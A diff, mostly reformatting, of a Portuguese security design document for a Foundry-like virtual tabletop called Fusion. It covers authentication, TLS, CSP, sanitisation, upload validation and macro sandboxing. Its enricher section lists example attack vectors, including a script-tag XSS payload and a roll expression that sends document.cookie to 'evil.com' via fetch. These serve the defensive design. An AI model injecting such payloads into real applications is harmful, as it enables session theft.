@@ -21,13 +21,13 @@ O GM roda o servidor na sua máquina pessoal, o que significa que um RCE bem-suc
 
 O Foundry VTT, referência mais próxima de arquitetura similar, acumulou vulnerabilidades documentadas:
 
-| Vulnerabilidade | Versões afetadas | Impacto | Referência |
-|---|---|---|---|
-| Path traversal no nome do pacote (módulo install) | < 0.7.10 / < 0.8.2 | Sobrescrita arbitrária de diretório → RCE via autostart | catnip.fyi/posts/foundry-p1 |
-| `getSetupData` WebSocket handler não autenticado | < 0.7.10 | Vazamento de path de instalação, username, config de mundos | catnip.fyi/posts/foundry-p1 |
-| Duas vulnerabilidades de RCE em Document modification workflow | < 13.351 | Execução de código arbitrário no servidor do GM | PT-2025-138 / PT-2025-139 (CVSS 7.1 e 8.4) |
-| Path traversal no file picker | < 0.4.0 | Browse/upload fora do User Data permitido | Release 0.4.0 |
-| Vulnerabilidade em biblioteca WEBM/Chromium (Electron) | Versões desatualizadas | RCE via browser engine | Release notes Foundry |
+| Vulnerabilidade                                                | Versões afetadas       | Impacto                                                     | Referência                                 |
+| -------------------------------------------------------------- | ---------------------- | ----------------------------------------------------------- | ------------------------------------------ |
+| Path traversal no nome do pacote (módulo install)              | < 0.7.10 / < 0.8.2     | Sobrescrita arbitrária de diretório → RCE via autostart     | catnip.fyi/posts/foundry-p1                |
+| `getSetupData` WebSocket handler não autenticado               | < 0.7.10               | Vazamento de path de instalação, username, config de mundos | catnip.fyi/posts/foundry-p1                |
+| Duas vulnerabilidades de RCE em Document modification workflow | < 13.351               | Execução de código arbitrário no servidor do GM             | PT-2025-138 / PT-2025-139 (CVSS 7.1 e 8.4) |
+| Path traversal no file picker                                  | < 0.4.0                | Browse/upload fora do User Data permitido                   | Release 0.4.0                              |
+| Vulnerabilidade em biblioteca WEBM/Chromium (Electron)         | Versões desatualizadas | RCE via browser engine                                      | Release notes Foundry                      |
 
 **Impacto real:** Positive Technologies estimou ~120.000 servidores Foundry VTT expostos publicamente na internet no momento da divulgação em 2025. O modelo de ameaça do Fusion é idêntico.
 
@@ -43,6 +43,7 @@ O Foundry usa dois sistemas paralelos de senha:
 2. **Senha por mundo/por usuário** — cada usuário de um World pode ter uma senha. Sem senha, a conta fica acessível sem autenticação. Não é obrigatório configurar.
 
 Problemas identificados no modelo do Foundry relevantes para o Fusion:
+
 - Senhas opcionais são um vetor real: jogadores sem senha ficam sem proteção
 - O endpoint de WebSocket de setup (`getSetupData`) vazou informações sem exigir autenticação (corrigido, mas o padrão é perigoso)
 - Não há menção a rate-limiting nativo de tentativas de login
@@ -54,13 +55,13 @@ Problemas identificados no modelo do Foundry relevantes para o Fusion:
 
 Usar **Argon2id** para todas as senhas (Admin Key + senhas de usuários de mundo).
 
-| Algoritmo | Status 2026 | Recomendação OWASP/NIST |
-|---|---|---|
-| **Argon2id** | Ouro — vencedor do PHC 2015, memory-hard | **Recomendado para novos projetos** |
-| bcrypt | Seguro, estável desde 1999, 72 bytes max | Aceitável se Argon2 criar dependências nativas problemáticas |
-| scrypt | Memory-hard, mas menos suporte em audit | Secundário |
-| PBKDF2 | Iterativo sem memory-hardness | Evitar para senhas |
-| SHA-*/MD5 direta | Inseguro | Nunca usar |
+| Algoritmo         | Status 2026                              | Recomendação OWASP/NIST                                      |
+| ----------------- | ---------------------------------------- | ------------------------------------------------------------ |
+| **Argon2id**      | Ouro — vencedor do PHC 2015, memory-hard | **Recomendado para novos projetos**                          |
+| bcrypt            | Seguro, estável desde 1999, 72 bytes max | Aceitável se Argon2 criar dependências nativas problemáticas |
+| scrypt            | Memory-hard, mas menos suporte em audit  | Secundário                                                   |
+| PBKDF2            | Iterativo sem memory-hardness            | Evitar para senhas                                           |
+| SHA-\*/MD5 direta | Inseguro                                 | Nunca usar                                                   |
 
 Parâmetros mínimos para Argon2id: `memory=65536 KiB (64 MB)`, `iterations=3`, `parallelism=4`.
 
@@ -105,6 +106,7 @@ Backoff exponencial após cada falha
 Bibliotecas: `rate-limiter-flexible` (suporta in-process, Redis, PostgreSQL — escalável).
 
 **Rate limiting de mensagens WebSocket:**
+
 - Máximo de 50 mensagens/segundo por conexão (token bucket)
 - Máximo de 10 novas conexões/minuto por IP
 - Fechar conexões que excedam limites após 3 avisos
@@ -116,6 +118,7 @@ Bibliotecas: `rate-limiter-flexible` (suporta in-process, Redis, PostgreSQL — 
 ### 3.1 TLS é obrigatório em produção
 
 Usar `ws://` ou `http://` em produção expõe:
+
 - Credenciais em texto claro (senhas, tokens)
 - Replay attacks no WebSocket
 - Downgrade attacks (strip TLS em redes adversariais)
@@ -127,6 +130,7 @@ Usar `ws://` ou `http://` em produção expõe:
 ```
 
 Vantagens:
+
 - Caddy renova certificados Let's Encrypt automaticamente
 - O processo Fusion roda sem privilégios de root (não precisa bind em :443)
 - O reverse proxy pode aplicar rate limiting, headers de segurança e logs centralizados
@@ -158,6 +162,7 @@ limit_req zone=login burst=3 nodelay;
 ### 3.2 Content Security Policy (CSP)
 
 Um VTT apresenta desafios únicos para CSP porque:
+
 - Carrega assets (imagens, fontes) de caminhos arbitrários escolhidos pelo usuário
 - Executa inline rolls (JS no cliente) via macros
 - Módulos de terceiros injetam scripts legítimos
@@ -181,12 +186,14 @@ Content-Security-Policy:
 **Nonces:** Gerar um nonce criptograficamente aleatório por request HTTP e injetá-lo nos `<script>` tags. Nunca usar nonce estático hardcoded. Usar `unsafe-inline` como fallback apenas durante desenvolvimento.
 
 **Problema prático com módulos de terceiros:** Módulos legítimos injetam scripts dinamicamente. O Fusion precisa de uma estratégia para permitir que módulos carreguem scripts sem desabilitar CSP inteiramente. Opções:
+
 - Listar hashes SHA-256 dos scripts conhecidos (`'sha256-...'`)
 - Usar uma `script-src` que permite apenas origens conhecidas do host local
 
 ### 3.3 CORS
 
 Para requisições HTTP REST (API):
+
 - `Access-Control-Allow-Origin`: apenas a própria origem ou `null` para requests locais
 - Nunca `*` para endpoints autenticados
 - `Access-Control-Allow-Credentials: true` apenas combinado com origem explícita
@@ -198,17 +205,18 @@ Para WebSocket: CORS não se aplica da mesma forma (browsers não enviam CORS pr
 **Mecanismo:** Um site malicioso pode abrir uma conexão WebSocket para `wss://meu-vtt.example.com` usando cookies da sessão da vítima (browsers enviam cookies automaticamente no upgrade). Isso bypassa a Same-Origin Policy porque WebSockets não a respeitam.
 
 **Mitigações obrigatórias:**
+
 1. **Validar o header `Origin`** no handshake de upgrade. Rejeitar conexões de origens não permitidas com HTTP 403.
 2. **Combinar com token explícito** no handshake (ex.: JWT no query string ou header custom) — tokens não são enviados automaticamente pelo browser, logo um site malicioso não consegue obtê-los.
 3. **Cookies `SameSite=Strict`** impedem o envio automático de cookies em requests cross-origin.
 
 ```javascript
 // Exemplo de validação de origin no upgrade
-server.on('upgrade', (request, socket, head) => {
-  const origin = request.headers['origin'];
+server.on("upgrade", (request, socket, head) => {
+  const origin = request.headers["origin"];
   const allowedOrigins = getAllowedOrigins(); // config carregada em runtime
   if (!allowedOrigins.includes(origin)) {
-    socket.write('HTTP/1.1 403 Forbidden\r\n\r\n');
+    socket.write("HTTP/1.1 403 Forbidden\r\n\r\n");
     socket.destroy();
     return;
   }
@@ -224,18 +232,19 @@ server.on('upgrade', (request, socket, head) => {
 
 O Fusion, como qualquer VTT, exibe HTML rico em múltiplos contextos:
 
-| Superfície | Origem do conteúdo | Risco |
-|---|---|---|
-| Chat messages | Qualquer jogador autenticado | Alto — HTML enriquecido com inline rolls |
-| Journal entries | GM / módulos / compendiums | Médio — conteúdo controlado pelo GM mas importado de fontes externas |
-| Item/Actor descriptions | Compendiums, sistema pf2e | Médio — JSON importado de OGL/ORC |
-| Macro output | Jogadores com permissão | Alto — resultado de execução JS |
-| Nomes de tokens/cenas | GM | Baixo — texto curto |
-| Tooltips / enrichers | Resolvidos pelo TextEditor | Médio — input do usuário passado por regex |
+| Superfície              | Origem do conteúdo           | Risco                                                                |
+| ----------------------- | ---------------------------- | -------------------------------------------------------------------- |
+| Chat messages           | Qualquer jogador autenticado | Alto — HTML enriquecido com inline rolls                             |
+| Journal entries         | GM / módulos / compendiums   | Médio — conteúdo controlado pelo GM mas importado de fontes externas |
+| Item/Actor descriptions | Compendiums, sistema pf2e    | Médio — JSON importado de OGL/ORC                                    |
+| Macro output            | Jogadores com permissão      | Alto — resultado de execução JS                                      |
+| Nomes de tokens/cenas   | GM                           | Baixo — texto curto                                                  |
+| Tooltips / enrichers    | Resolvidos pelo TextEditor   | Médio — input do usuário passado por regex                           |
 
 ### 4.2 DOMPurify como camada obrigatória
 
 **DOMPurify** é o padrão-ouro para sanitização HTML no browser:
+
 - Desenvolvido e auditado pela cure53 (Berlin)
 - ~7 milhões de downloads semanais
 - DOM-based: usa o próprio parser HTML do browser, evita falsos negativos de regex
@@ -243,31 +252,46 @@ O Fusion, como qualquer VTT, exibe HTML rico em múltiplos contextos:
 **Nota de CVE recente:** CVE-2025-26791 — vulnerabilidade em template literals em regex em versões específicas do DOMPurify. Manter sempre na versão mais recente. Monitorar `GHSA-*` no repositório do DOMPurify.
 
 **Regra de defesa em profundidade (dupla sanitização):**
+
 - **Server-side:** Sanitizar com `sanitize-html` (Node.js) antes de persistir no banco de dados
 - **Client-side:** Sanitizar com `DOMPurify` antes de injetar no DOM
 
 ```javascript
 // Server-side — ao receber mensagem de chat
-import sanitizeHtml from 'sanitize-html';
+import sanitizeHtml from "sanitize-html";
 
 const cleanContent = sanitizeHtml(rawInput, {
-  allowedTags: ['b', 'i', 'em', 'strong', 'a', 'span', 'p', 'br',
-                 'ul', 'ol', 'li', 'h1', 'h2', 'h3'],
+  allowedTags: [
+    "b",
+    "i",
+    "em",
+    "strong",
+    "a",
+    "span",
+    "p",
+    "br",
+    "ul",
+    "ol",
+    "li",
+    "h1",
+    "h2",
+    "h3",
+  ],
   allowedAttributes: {
-    'a': ['href', 'data-uuid'],
-    'span': ['class', 'data-roll'],
+    a: ["href", "data-uuid"],
+    span: ["class", "data-roll"],
   },
-  allowedSchemes: ['https', 'http'],
+  allowedSchemes: ["https", "http"],
   // Proibir javascript: e data: em href/src
 });
 
 // Client-side — antes de inserir no DOM
-import DOMPurify from 'dompurify';
+import DOMPurify from "dompurify";
 
 const safeHTML = DOMPurify.sanitize(serverContent, {
-  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'span', 'p', 'br'],
-  ALLOWED_ATTR: ['href', 'class', 'data-uuid', 'data-roll'],
-  FORBID_ATTR: ['style', 'onerror', 'onload'],
+  ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "span", "p", "br"],
+  ALLOWED_ATTR: ["href", "class", "data-uuid", "data-roll"],
+  FORBID_ATTR: ["style", "onerror", "onload"],
   FORCE_BODY: true,
 });
 element.innerHTML = safeHTML;
@@ -278,11 +302,13 @@ element.innerHTML = safeHTML;
 O Foundry processa padrões como `[[2d6+3]]`, `@UUID[Actor.xxx]{Nome}`, `@Check[...]` antes de renderizar HTML. Esses **enrichers** são um vetor de injeção se não processados corretamente:
 
 **Vetores de ataque em enrichers:**
+
 - `@UUID[<script>alert(1)</script>]{texto}` — se o UUID não for validado antes de ser inserido no DOM
 - `[[constructor.constructor('fetch("evil.com/"+document.cookie)')()')]]` — se expressões de roll avaliarem JS arbitrário
 - Path traversal via UUID que referencia compendiums externos
 
 **Defesa:**
+
 1. **Validar formato do UUID antes de processar**: UUID deve ser `[A-Za-z]+\.[A-Za-z0-9_-]{16}` ou similar — nunca aceitar strings arbitrárias como UUID
 2. **Sandboxar a avaliação de expressões de roll**: usar um parser de expressão matemática dedicado (ex.: `mathjs` com escopo restrito), nunca `eval()`
 3. **Sanitizar o output do enricher** antes de injetar no DOM, mesmo após o processamento
@@ -298,59 +324,66 @@ O Foundry corrigiu path traversal no file picker em 0.4.0 e no instalador de mó
 ### 5.2 Regras para o Fusion
 
 **Regra 1 — Nunca usar o nome original do arquivo diretamente:**
+
 ```javascript
 // ERRADO
 const filePath = path.join(UPLOAD_DIR, req.file.originalname);
 
 // CORRETO
-import crypto from 'crypto';
-const safeFilename = crypto.randomBytes(16).toString('hex') + path.extname(req.file.originalname).toLowerCase();
+import crypto from "crypto";
+const safeFilename =
+  crypto.randomBytes(16).toString("hex") + path.extname(req.file.originalname).toLowerCase();
 const filePath = path.join(UPLOAD_DIR, safeFilename);
 ```
 
 **Regra 2 — Validar extensão E magic bytes (não confiar no MIME do client):**
 
 ```javascript
-import { fileTypeFromBuffer } from 'file-type';
+import { fileTypeFromBuffer } from "file-type";
 
 const ALLOWED_TYPES = new Map([
-  ['image/jpeg', ['.jpg', '.jpeg']],
-  ['image/png', ['.png']],
-  ['image/webp', ['.webp']],
-  ['image/gif', ['.gif']],
-  ['audio/ogg', ['.ogg']],
-  ['audio/mpeg', ['.mp3']],
-  ['video/webm', ['.webm']],
-  ['application/pdf', ['.pdf']],
+  ["image/jpeg", [".jpg", ".jpeg"]],
+  ["image/png", [".png"]],
+  ["image/webp", [".webp"]],
+  ["image/gif", [".gif"]],
+  ["audio/ogg", [".ogg"]],
+  ["audio/mpeg", [".mp3"]],
+  ["video/webm", [".webm"]],
+  ["application/pdf", [".pdf"]],
 ]);
 
 const detectedType = await fileTypeFromBuffer(fileBuffer);
 const reportedExt = path.extname(originalName).toLowerCase();
 
-if (!detectedType || !ALLOWED_TYPES.has(detectedType.mime) ||
-    !ALLOWED_TYPES.get(detectedType.mime).includes(reportedExt)) {
-  throw new SecurityError('Tipo de arquivo não permitido');
+if (
+  !detectedType ||
+  !ALLOWED_TYPES.has(detectedType.mime) ||
+  !ALLOWED_TYPES.get(detectedType.mime).includes(reportedExt)
+) {
+  throw new SecurityError("Tipo de arquivo não permitido");
 }
 ```
 
 **Regra 3 — Normalizar e confirmar que o path final está dentro do diretório permitido:**
+
 ```javascript
 const resolvedPath = path.resolve(UPLOAD_DIR, safeFilename);
 if (!resolvedPath.startsWith(path.resolve(UPLOAD_DIR))) {
-  throw new SecurityError('Path traversal detectado');
+  throw new SecurityError("Path traversal detectado");
 }
 ```
 
 **Regra 4 — Separar diretórios por permissão de papel:**
 
-| Diretório | Quem pode escrever | Notas |
-|---|---|---|
-| `assets/public/` | GM e usuários "Trusted" (se configurado) | Servido estaticamente |
-| `assets/modules/` | Apenas processo de instalação do sistema | Não editável por usuários |
-| `data/worlds/` | Apenas o servidor (nunca upload direto) | Dados de jogo estruturados |
-| `Config/` | Apenas CLI/processo local | Nunca exposto via HTTP |
+| Diretório         | Quem pode escrever                       | Notas                      |
+| ----------------- | ---------------------------------------- | -------------------------- |
+| `assets/public/`  | GM e usuários "Trusted" (se configurado) | Servido estaticamente      |
+| `assets/modules/` | Apenas processo de instalação do sistema | Não editável por usuários  |
+| `data/worlds/`    | Apenas o servidor (nunca upload direto)  | Dados de jogo estruturados |
+| `Config/`         | Apenas CLI/processo local                | Nunca exposto via HTTP     |
 
 **Regra 5 — Limitar tamanho de arquivo:**
+
 - Assets de imagem: máximo 10 MB
 - Audio: máximo 50 MB
 - Video: máximo 200 MB
@@ -365,26 +398,28 @@ if (!resolvedPath.startsWith(path.resolve(UPLOAD_DIR))) {
 Macros de script no VTT executam JavaScript fornecido pelo usuário. No Foundry, o código de macro executa diretamente no contexto da página (browser), com acesso total à API do Foundry e ao DOM. A "sandbox" é apenas a permissão RBAC do usuário — se o usuário tem a permissão `MACRO_SCRIPT`, ele tem execução JS praticamente irrestrita no browser.
 
 **No contexto do Fusion**, isso significa:
+
 - Uma macro maliciosa pode fazer `fetch()` para endpoints do servidor usando as credenciais do GM
 - Pode exfiltrar dados de outros usuários via side-channels
 - Pode modificar o DOM para criar phishing visual
 
 ### 6.2 Estado do ecossistema de sandboxes JS (2025-2026)
 
-| Abordagem | Status | Avaliação |
-|---|---|---|
-| `node:vm` | NÃO é sandbox real | Trivialmente escapável — nunca usar para código não confiável |
-| `vm2` | Histórico ruim, abandonado em 2023, ressuscitado em 2025 | Acumulou 20+ escapes conhecidos; maintainer mesmo desaconselha para código hostil |
-| `isolated-vm` | V8 Isolates reais, manutenção ativa | Melhor opção server-side; OOM pode crashar processo |
-| `QuickJS WASM` | JS engine separada compilada em WASM | Isolamento forte; sintaxe ES moderna pode ser incompleta; overhead |
-| Web Worker (browser) | Isolamento de heap, sem acesso ao DOM | Bom para macros no browser; pode fazer fetch() — precisa de política de rede |
-| `iframe sandbox` (browser) | CSP + `sandbox` attribute | Pode bloquear acesso à API do Foundry se muito restrito |
+| Abordagem                  | Status                                                   | Avaliação                                                                         |
+| -------------------------- | -------------------------------------------------------- | --------------------------------------------------------------------------------- |
+| `node:vm`                  | NÃO é sandbox real                                       | Trivialmente escapável — nunca usar para código não confiável                     |
+| `vm2`                      | Histórico ruim, abandonado em 2023, ressuscitado em 2025 | Acumulou 20+ escapes conhecidos; maintainer mesmo desaconselha para código hostil |
+| `isolated-vm`              | V8 Isolates reais, manutenção ativa                      | Melhor opção server-side; OOM pode crashar processo                               |
+| `QuickJS WASM`             | JS engine separada compilada em WASM                     | Isolamento forte; sintaxe ES moderna pode ser incompleta; overhead                |
+| Web Worker (browser)       | Isolamento de heap, sem acesso ao DOM                    | Bom para macros no browser; pode fazer fetch() — precisa de política de rede      |
+| `iframe sandbox` (browser) | CSP + `sandbox` attribute                                | Pode bloquear acesso à API do Foundry se muito restrito                           |
 
 ### 6.3 Recomendação para o Fusion
 
 **Arquitetura de dois níveis:**
 
 **Nível 1 — Macros de "chat" (baixo privilégio, execução no browser):**
+
 - Executar em um Web Worker isolado
 - O Worker recebe uma API serializada (não referências vivas a objetos do Foundry)
 - O Worker não tem acesso ao DOM, ao `document`, nem ao `window` principal
@@ -392,21 +427,22 @@ Macros de script no VTT executam JavaScript fornecido pelo usuário. No Foundry,
 
 ```javascript
 // Macro executa em Worker isolado
-const worker = new Worker('/sandbox-worker.js', { type: 'module' });
+const worker = new Worker("/sandbox-worker.js", { type: "module" });
 worker.postMessage({
-  type: 'EXEC_MACRO',
+  type: "EXEC_MACRO",
   code: macroCode,
   context: serializeContext(actor, token), // snapshot, não referência viva
 });
-worker.addEventListener('message', (e) => {
-  if (e.data.type === 'RESULT') applyMacroResult(e.data.payload);
-  if (e.data.type === 'ERROR') displayError(e.data.message);
+worker.addEventListener("message", (e) => {
+  if (e.data.type === "RESULT") applyMacroResult(e.data.payload);
+  if (e.data.type === "ERROR") displayError(e.data.message);
 });
 // Timeout: matar Worker após 5 segundos
 setTimeout(() => worker.terminate(), 5000);
 ```
 
 **Nível 2 — Macros de "GM Script" (alto privilégio, execução no servidor via `executeAsGM`):**
+
 - Usar `isolated-vm` no servidor para sandboxar a execução
 - Whitelist de APIs disponíveis (operações de Document, sem acesso a `fs`, `net`, `child_process`)
 - Timeout configurável (padrão: 10 segundos)
@@ -417,11 +453,13 @@ setTimeout(() => worker.terminate(), 5000);
 O padrão `executeAsGM` do socketlib é um vetor de **privilege escalation** se não validado corretamente:
 
 **Como funciona o risco:**
+
 1. Jogador (Player) chama `socket.executeAsGM('executarFuncao', payload)`
 2. A função é executada no browser do GM com permissões de GM
 3. Se `executarFuncao` não validar o `payload`, um jogador malicioso pode passar parâmetros inesperados
 
 **Regras de defesa para qualquer função registrada como executável remotamente:**
+
 1. **Whitelist de ações**: Nunca registrar funções genéricas que aceitam "qualquer ação". Cada função registrada deve ter um propósito específico.
 2. **Validar payload com Zod** antes de qualquer operação
 3. **Revalidar permissões no servidor**: A execução no GM não implica que o jogador tem permissão para o efeito pretendido — revalidar se o jogador de origem tem permissão para aquela operação específica
@@ -470,6 +508,7 @@ O sistema pf2e usa `system.rules` (Rule Elements) — arrays de objetos JSON que
 ```
 
 Ao importar compendiums de terceiros (não os OGL oficiais do repositório `foundryvtt/pf2e`), esses objetos podem conter:
+
 - Chaves inválidas que disparam comportamento inesperado
 - Valores de `value` sendo strings que avaliam expressões (`@actor.system.attributes.hp.value * 100`)
 - Referências circulares que causam loops infinitos na preparação de dados
@@ -480,26 +519,34 @@ Ao importar compendiums de terceiros (não os OGL oficiais do repositório `foun
 **Validação de schema antes de persistir (Zod + Fastify):**
 
 ```typescript
-import { z } from 'zod';
+import { z } from "zod";
 
 // Schema de um Rule Element genérico
-const RuleElementSchema = z.object({
-  key: z.enum([
-    'FlatModifier', 'ActiveEffectLike', 'TokenName', 'DamageAlteration',
-    // ... enum exaustivo das chaves válidas do sistema
-  ]),
-  selector: z.string().max(128).regex(/^[a-z.:-]+$/i),
-  value: z.union([
-    z.number(),
-    z.string().max(256), // expressões permitidas
-  ]),
-  predicate: z.array(z.string().max(64)).max(20).optional(),
-  label: z.string().max(256).optional(),
-}).strict(); // .strict() rejeita chaves desconhecidas
+const RuleElementSchema = z
+  .object({
+    key: z.enum([
+      "FlatModifier",
+      "ActiveEffectLike",
+      "TokenName",
+      "DamageAlteration",
+      // ... enum exaustivo das chaves válidas do sistema
+    ]),
+    selector: z
+      .string()
+      .max(128)
+      .regex(/^[a-z.:-]+$/i),
+    value: z.union([
+      z.number(),
+      z.string().max(256), // expressões permitidas
+    ]),
+    predicate: z.array(z.string().max(64)).max(20).optional(),
+    label: z.string().max(256).optional(),
+  })
+  .strict(); // .strict() rejeita chaves desconhecidas
 
 const ItemSchema = z.object({
   name: z.string().max(256),
-  type: z.enum(['weapon', 'armor', 'feat', 'spell', /* ... */]),
+  type: z.enum(["weapon", "armor", "feat", "spell" /* ... */]),
   system: z.object({
     rules: z.array(RuleElementSchema).max(50),
     // demais campos do sistema
@@ -508,12 +555,14 @@ const ItemSchema = z.object({
 ```
 
 **Sandboxar a avaliação de expressões em `value`:**
+
 - Expressões como `@actor.system.attributes.hp.value` devem ser processadas por um parser dedicado (AST), não por `eval()` ou `new Function()`
 - Whitelist de operadores: `+`, `-`, `*`, `/`, `floor()`, `ceil()`, `max()`, `min()`
 - Blacklist de propriedades: acesso a `__proto__`, `constructor`, `prototype`
 - Profundidade máxima de acesso a propriedades: 4 níveis
 
 **Importação de compendiums:**
+
 1. Aplicar validação de schema em cada item/actor antes de persistir
 2. Rejeitar (e logar) itens com Rule Elements inválidos — não silenciar erros
 3. Para compendiums externos (não oficiais), exibir aviso ao GM e requerer confirmação explícita
@@ -529,18 +578,18 @@ O Fastify usa `ajv` internamente e `ajv` usa `new Function()` para compilar sche
 
 Baseado no OWASP Top 10:2025:
 
-| # | Categoria OWASP 2025 | Manifestação no Fusion | Mitigação |
-|---|---|---|---|
-| A01 | Broken Access Control | executeAsGM sem revalidação de permissão; CSWSH; endpoints de setup sem auth | Validação de permissão server-side; Origin header; autenticação obrigatória em todos os endpoints |
-| A02 | Security Misconfiguration | Admin Key não configurada; `ws://` sem TLS; CORS aberto; UPnP expondo porta | Wizard de primeiro uso obrigando configuração; HTTPS por padrão; CSP |
-| A03 | Injection | XSS em chat/journal; path traversal em uploads; eval() em roll expressions; Rule Elements injetando código | DOMPurify + sanitize-html; path resolve validation; parser matemático dedicado; Zod schemas |
-| A04 | Insecure Design | Macros com acesso irrestrito ao DOM; executeAsGM como proxy genérico | Arquitetura de Worker sandboxado; whitelist de ações remotas |
-| A05 | Security Misconfiguration | Headers de segurança ausentes; CSP não configurada; cookies sem flags | Middleware que injeta headers; configuração testada em CI |
-| A06 | Vulnerable Components | vm2 com histórico de escapes; DOMPurify desatualizado; Electron/Chromium com CVEs | Pinning de versões; Dependabot; monitorar GHSA |
-| A07 | Auth Failures | Senhas sem rate limit; sessões não expiram; refresh tokens sem rotação | Argon2id + rate-limiter-flexible; JWT com exp curto; refresh rotation |
-| A08 | Software Integrity | Módulos de terceiros sem verificação; compendiums com Rule Elements maliciosos | Checksums de módulos; validação de schema na importação |
-| A09 | Logging Failures | Ausência de logs de auth falhos; macros executadas sem rastreabilidade | Log estruturado de todas as auth failures; log de execução de macros com user/timestamp |
-| A10 | SSRF | Fetch de manifests de módulos a URLs arbitrárias (vetor histórico do Foundry) | Validar domínio antes de fetch; allowlist opcional de registries; timeout curto |
+| #   | Categoria OWASP 2025      | Manifestação no Fusion                                                                                     | Mitigação                                                                                         |
+| --- | ------------------------- | ---------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------- |
+| A01 | Broken Access Control     | executeAsGM sem revalidação de permissão; CSWSH; endpoints de setup sem auth                               | Validação de permissão server-side; Origin header; autenticação obrigatória em todos os endpoints |
+| A02 | Security Misconfiguration | Admin Key não configurada; `ws://` sem TLS; CORS aberto; UPnP expondo porta                                | Wizard de primeiro uso obrigando configuração; HTTPS por padrão; CSP                              |
+| A03 | Injection                 | XSS em chat/journal; path traversal em uploads; eval() em roll expressions; Rule Elements injetando código | DOMPurify + sanitize-html; path resolve validation; parser matemático dedicado; Zod schemas       |
+| A04 | Insecure Design           | Macros com acesso irrestrito ao DOM; executeAsGM como proxy genérico                                       | Arquitetura de Worker sandboxado; whitelist de ações remotas                                      |
+| A05 | Security Misconfiguration | Headers de segurança ausentes; CSP não configurada; cookies sem flags                                      | Middleware que injeta headers; configuração testada em CI                                         |
+| A06 | Vulnerable Components     | vm2 com histórico de escapes; DOMPurify desatualizado; Electron/Chromium com CVEs                          | Pinning de versões; Dependabot; monitorar GHSA                                                    |
+| A07 | Auth Failures             | Senhas sem rate limit; sessões não expiram; refresh tokens sem rotação                                     | Argon2id + rate-limiter-flexible; JWT com exp curto; refresh rotation                             |
+| A08 | Software Integrity        | Módulos de terceiros sem verificação; compendiums com Rule Elements maliciosos                             | Checksums de módulos; validação de schema na importação                                           |
+| A09 | Logging Failures          | Ausência de logs de auth falhos; macros executadas sem rastreabilidade                                     | Log estruturado de todas as auth failures; log de execução de macros com user/timestamp           |
+| A10 | SSRF                      | Fetch de manifests de módulos a URLs arbitrárias (vetor histórico do Foundry)                              | Validar domínio antes de fetch; allowlist opcional de registries; timeout curto                   |
 
 ---
 
@@ -549,6 +598,7 @@ Baseado no OWASP Top 10:2025:
 ### 9.1 Wizard obrigatório de primeiro uso
 
 Na primeira inicialização, o Fusion deve:
+
 1. Gerar um Admin Key aleatório (32 bytes hex) e exibir ao GM
 2. Exibir aviso se o servidor não estiver atrás de TLS
 3. Configurar automaticamente UPnP como **desabilitado por padrão** (opt-in explícito)
@@ -587,6 +637,7 @@ Na primeira inicialização, o Fusion deve:
 ## 10. Checklist de Implementação (para os Desenvolvedores)
 
 ### Autenticação
+
 - [ ] Argon2id para todas as senhas (Admin Key + usuários de mundo)
 - [ ] JWT access token (exp: 15 min) + refresh token em cookie httpOnly
 - [ ] Rotação de refresh token a cada renovação + detecção de reuso
@@ -596,18 +647,21 @@ Na primeira inicialização, o Fusion deve:
 - [ ] Validação de `Origin` header no WebSocket upgrade (CSWSH)
 
 ### TLS e Headers
+
 - [ ] Documentação e configuração de exemplo para Caddy e Nginx
 - [ ] Middleware de headers: HSTS, X-Content-Type-Options, X-Frame-Options, Referrer-Policy
 - [ ] CSP com nonce por request (não `unsafe-inline` em produção)
 - [ ] `connect-src` da CSP incluindo `wss://` explicitamente
 
 ### Sanitização
+
 - [ ] `sanitize-html` no servidor antes de persistir chat e journal
 - [ ] `DOMPurify` no cliente antes de inserir no DOM
 - [ ] UUID enricher: validar formato com regex antes de processar
 - [ ] Roll expressions: parser matemático (mathjs restrito), nunca `eval()`
 
 ### Uploads e Assets
+
 - [ ] Renomear arquivos para random hex + extensão detectada
 - [ ] Validar magic bytes com `file-type` (não confiar no MIME do client)
 - [ ] `path.resolve()` + confirmação que o path está dentro do UPLOAD_DIR
@@ -615,6 +669,7 @@ Na primeira inicialização, o Fusion deve:
 - [ ] Diretórios segregados por nível de permissão
 
 ### Macros e executeAsGM
+
 - [ ] Macros de chat executam em Web Worker (sem acesso ao DOM principal)
 - [ ] Timeout de 5s em execução de macros
 - [ ] Log de toda execução de macro (usuário, timestamp, primeiros 500 chars do código)
@@ -622,6 +677,7 @@ Na primeira inicialização, o Fusion deve:
 - [ ] Rate limit de chamadas executeAsGM por usuário
 
 ### Importação de Dados
+
 - [ ] Zod schema para cada tipo de item/actor/scene antes de persistir
 - [ ] `.strict()` nos schemas para rejeitar chaves desconhecidas
 - [ ] Expressões em Rule Elements: AST parser com whitelist de operadores
@@ -629,6 +685,7 @@ Na primeira inicialização, o Fusion deve:
 - [ ] Nunca usar `new Function()` com dados de usuário
 
 ### Logging e Monitoração
+
 - [ ] Log estruturado (JSON) de todas as falhas de autenticação
 - [ ] Log de tentativas de path traversal (detectadas) com IP e payload
 - [ ] Log de execuções de macro (GM e Player)
